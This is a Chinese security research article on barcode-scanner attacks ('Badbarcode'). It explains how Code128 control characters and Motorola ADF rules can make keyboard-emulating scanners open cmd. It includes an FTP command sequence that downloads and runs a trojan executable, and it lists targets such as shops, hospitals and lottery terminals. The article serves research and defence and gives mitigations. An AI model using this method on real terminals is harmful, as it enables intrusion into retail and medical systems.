# 一维条形码攻击技术(Badbarcode)

**Author:数据流@伏宸安全实验室**

0x00 前言
=======

* * *

在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主 在PacSec介绍的条形码攻击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。 : )

0x01 条形码介绍
==========

* * *

![p1](http://drops.javaweb.org/uploads/images/d4d0d54c51af484f68803d3b65d44cc1da9d53cd.jpg)

条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。

常见的条形码类型有code39 code128 code93 EAN128 EAN13 QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类型，一般都利用code128条形码进行攻击。

0x02 扫码器介绍
==========

* * *

![p2](http://drops.javaweb.org/uploads/images/0a72a30ec931335eeb992c27435effa4847c6980.jpg)

扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。

大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。

![p3](http://drops.javaweb.org/uploads/images/84a430fdaf9644f94c4bbf528c82b33faa6d12f9.jpg)

0x03 Code128条形码
===============

* * *

既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII 0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。

Code128也分为三种：

1.  Code128A：标准数字和大写字母，控制符，特殊字符
2.  Code128B：标准数字和大写字母，小写字母，特殊字符
3.  Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。

Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码

![p4](http://drops.javaweb.org/uploads/images/4d266db21814e58a7208aa4befc56d46f9871894.jpg)

如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。

起始码对照：

*   128A 11010000100
*   128B 11010010000
*   128C 11010011100

结束码都是统一的`1100011101011`

根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。

![p5](http://drops.javaweb.org/uploads/images/3082a9dcfab4b6788786892c6f52cbde171d6a04.jpg)

![p6](http://drops.javaweb.org/uploads/images/551f97dc8fcf25bea5ba437d9d86886416f15fec.jpg)

最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）

0x04 控制字符与条形码生成
===============

* * *

根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。

![p7](http://drops.javaweb.org/uploads/images/6a056cb0573cae5bb9c17195aae78d1083f630ec.jpg)

根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender

![p8](http://drops.javaweb.org/uploads/images/0acb1feff4ca3fb9511bdcc3900ac395da43ecd9.jpg)

下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。

![p9](http://drops.javaweb.org/uploads/images/1ee8f288657caf2feca86590a8be463054ebcd3d.jpg)

然后点击条形码按钮就可以创建自己的条形码，选择code128类型。

![p10](http://drops.javaweb.org/uploads/images/b95fac054bf4bd9b19a9358714de8b87a3c1b1be.jpg)

利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O

![p11](http://drops.javaweb.org/uploads/images/a7377847f14f183586f2d8175b70c7bafb06680e.jpg)

扫码器扫描后立即弹出对话框

市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。

0x05 Advanced Data Formatting（高级数据格式）
=====================================

* * *

Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。

例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。

再举个例子：

条形码的数据：

`8523647122`

通过ADF输出的数据：

`8523641<Enter>`

如何实现ADF？

![p12](http://drops.javaweb.org/uploads/images/dff74dcf5cc3602ca4edb63e8423db0ecefe097e.jpg)

现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。

ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。

**利用ADF挟持扫描器数据**

对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule

![p13](http://drops.javaweb.org/uploads/images/1bd5e700f41888279bbfe9c1c03998bffb6b6b58.jpg)

此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。

随后依次扫描下列条形码

![p14](http://drops.javaweb.org/uploads/images/e064e2948e7f7358bc8470de5da4feabcd4d79e0.jpg)

![p15](http://drops.javaweb.org/uploads/images/87a07e622793747fee1db4641ce1a8c2dc53a503.jpg)

![p16](http://drops.javaweb.org/uploads/images/6b0a5721bec2a91fcee2f4c4a42cc4d3ec13f38e.jpg)

![p17](http://drops.javaweb.org/uploads/images/5cbedc589f6f2a278440fca65f065e0ca886d14e.jpg)

然后Save Rule

![p18](http://drops.javaweb.org/uploads/images/d6351f5257ed9fead80377e3e2b59672d4140502.jpg)

当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。

如何恢复？

![p19](http://drops.javaweb.org/uploads/images/5dedf0d5a3847817d41447303fa241d0bace0e69.jpg)

扫描清除所有规则条形码即可。

0x06 利用ADF执行命令，种植木马
===================

* * *

由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。

![p20](http://drops.javaweb.org/uploads/images/f8cca4beed8a53b8d21154bb14b285eba309a45f.jpg)

在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行"c","m","d"，`win+r`的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的`sleep()`。

![p21](http://drops.javaweb.org/uploads/images/8d8ba716990fe0ce18790f65c29f380c618fe69f.jpg)

在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。

知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：

[https://twitter.com/tombkeeper/status/663730674017300480](https://twitter.com/tombkeeper/status/663730674017300480)

视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。

![p22](http://drops.javaweb.org/uploads/images/d4a86cae2a74f5ace2c28753b4cb4584706ca8d4.jpg)

这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器软件123scan。

![p23](http://drops.javaweb.org/uploads/images/ee065057b65c11e805beb140fe07cb332e441aa6.jpg)

123scan是摩托罗拉官方出品非常强大的扫描器管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。

打开后点击"Create new configuration file"->"My scanner is NOT connected"->选择扫描器->"Mondify data"->"Program complex data modifications"->"Create a new rule"。

![p24](http://drops.javaweb.org/uploads/images/6c9818e7752121f63ef8f28a88ab02e240cf2460.jpg)

点击Add action就是添加规则。

![p25](http://drops.javaweb.org/uploads/images/0d3f88487b631d19cd55ef307dc61340b81d5f8e.jpg)

ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。

![p26](http://drops.javaweb.org/uploads/images/3dcbc1d1fe06a37bcd5b3feba64ba55a044cd1b0.jpg)

设置延时0.5秒，依次添加规则。

![p27](http://drops.javaweb.org/uploads/images/d40301f81e5625c90d7f53f9aa568570aefababb.jpg)

最后会自动合并条形码并输出。

![p28](http://drops.javaweb.org/uploads/images/9e2d5f7a4b9708659926acb89544d0a40699ef38.jpg)

以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send ALL that remains是代表设置ADF后扫描条形码的原本数据。 以上四组条形码的ADF流程是:输入WIN+R键->延时0.5秒->输入c键->输入m键->输入d键->输入回车->延时0.5秒->执行条形码的内容，而随后的Send ALL that remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。

**利用ADF种植木马**

既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。

![p29](http://drops.javaweb.org/uploads/images/b2bd6be645907af85dc1da9f64ee540cf14b205a.jpg)

```
ftp test«CR»a«CR»a«CR»get w.exe«CR»bye«CR»w.exe«CR»get w.exe«CR»bye«CR»w.exe«CR»

```

下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。

（测试型号Symbol-LS4208-SR20001ZZR）

[http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2](http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2)

密码:wooyun520

0x07 攻击场景
=========

* * *

简单总结一下可能存在攻击的场景地点:

**1.商店付款**

![p30](http://drops.javaweb.org/uploads/images/a1758f22d4b2a584652363aa16adde539160821e.jpg)

直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。

**2.医院病历，检验单**

![p31](http://drops.javaweb.org/uploads/images/6530ef232587c761973716702b1c7eca0edaa891.jpg)

现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。

![p32](http://drops.javaweb.org/uploads/images/113c9f44e7480de0820fd0f3f05b778519f277aa.jpg)

**3.彩票**

![p32](http://drops.javaweb.org/uploads/images/c7d71b08f9a7c6def77dbcf5c38445611d46822c.jpg)

彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。

![p33](http://drops.javaweb.org/uploads/images/874bfe8625e16a8eaa07821251cfb8da03daf424.jpg)

**4.快递单子**

![p34](http://drops.javaweb.org/uploads/images/419f8385de4d7ea93ddadc0fd70c2b0ab0723ebf.jpg)

快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。

![p35](http://drops.javaweb.org/uploads/images/75b97d62ca4825518b82c799507c8fa105505ea1.jpg)

。。。。。。

场景很多就不一一列举了，以上场景有空我会逐一分析。

0x08 防范方法
=========

* * *

1.  扫码器默认不要开启ADF功能
2.  扫描器尽量不要使用键盘模拟
3.  设置热键黑名单

0x09 总结
=======

* * *

一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。

无论什么设备，只要能控制一部分输入，就存在风险！

0x0A 参考文献
=========

* * *

*   [http://www.appsbarcode.com/code%20128.php](http://www.appsbarcode.com/code%20128.php)Code 128 條碼．編碼規則
*   [http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-badbarcode-en1109nocommentfinal](http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-badbarcode-en1109nocommentfinal)PacSecJP-badbarcode-tk